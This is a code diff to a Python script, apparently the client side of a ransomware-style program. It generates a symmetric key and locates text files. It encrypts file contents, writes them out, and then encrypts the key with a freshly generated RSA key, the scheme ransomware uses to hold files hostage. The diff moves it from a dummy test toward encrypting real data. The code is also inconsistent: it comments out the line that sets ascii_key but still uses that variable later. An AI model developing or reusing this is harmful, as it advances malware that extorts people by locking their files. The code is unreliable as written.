@@ -21,17 +21,23 @@ how the pipeline works (when you run the client.exe file):
 from utils import *
 
 #1
-generate_key(16)
+a=generate_key(16)
 
 #2
-# findTxtFile()
+findTxtFile()
 
 #3
 # here we need to encrypt the test files from the previous step, but for now we use a dummy file
-ascii_key = testEncryption()
+#ascii_key = testEncryption()
+file_path = r'file_paths.txt'
+
+with open(file_path, 'r') as f:
+        data = f.read()
+encrypted_data = encrypt_data(a, data)
+
 
 #4
-saveKey(ascii_key, "Key.key")
+saveKey(a, "Key.key")
 
 #5
 exported_public_key, exported_private_key =  generateRSAKeys()
@@ -46,6 +52,8 @@ public_key = RSA.import_key(exported_public_key)
 #convert ascii_key to bytes
 byte_ascii_key = ascii_key.encode()
 encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
+with open('encrypted_file', 'wb') as f:
+        f.write(encrypted_data)
 
 #8
 saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
